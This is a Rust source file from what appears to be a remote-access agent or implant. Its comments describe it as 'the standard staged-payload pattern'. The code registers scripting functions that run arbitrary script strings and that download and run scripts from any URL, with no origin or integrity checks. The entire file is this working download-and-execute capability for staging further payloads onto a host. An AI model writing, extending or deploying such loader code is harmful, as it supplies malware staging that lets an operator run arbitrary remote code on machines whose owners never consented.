// src/agent/scripting/loader.rs
//
// Allows a running Rhai script to download and execute another script,
// or to evaluate an arbitrary Rhai string — the standard staged-payload pattern.
//
// Each call creates a fresh ExtensionManager so the child script has the full
// API surface but its own scope. State written with internal_state_set is shared
// (same Arc) if the parent passed it through; otherwise it's isolated.

use rhai::Engine;

pub fn register(engine: &mut Engine) {

    // Evaluate a Rhai script string in a fresh engine and return its output.
    engine.register_fn("internal_exec_script", |script: &str| -> String {
        let mut em = super::ExtensionManager::new();
        em.run_script(script, vec![])
    });

    // Download a Rhai script from a URL and execute it.
    // Accepts any HTTP/HTTPS URL; uses the agent's configured reqwest client.
    engine.register_fn("internal_load_script", |url: &str| -> String {
        let script = match reqwest::blocking::get(url) {
            Ok(r)  => match r.text() {
                Ok(t)  => t,
                Err(e) => return format!("Error reading response: {}", e),
            },
            Err(e) => return format!("Error fetching {}: {}", url, e),
        };
        let mut em = super::ExtensionManager::new();
        em.run_script(&script, vec![])
    });

    // Download and execute a script, passing additional args to it.
    // args_json: JSON array of strings that become the `args` variable in the script.
    engine.register_fn("internal_load_script_args", |url: &str, args_json: &str| -> String {
        let script = match reqwest::blocking::get(url) {
            Ok(r)  => r.text().unwrap_or_default(),
            Err(e) => return format!("Error: {}", e),
        };
        let args: Vec<String> = serde_json::from_str(args_json).unwrap_or_default();
        let mut em = super::ExtensionManager::new();
        em.run_script(&script, args)
    });
}
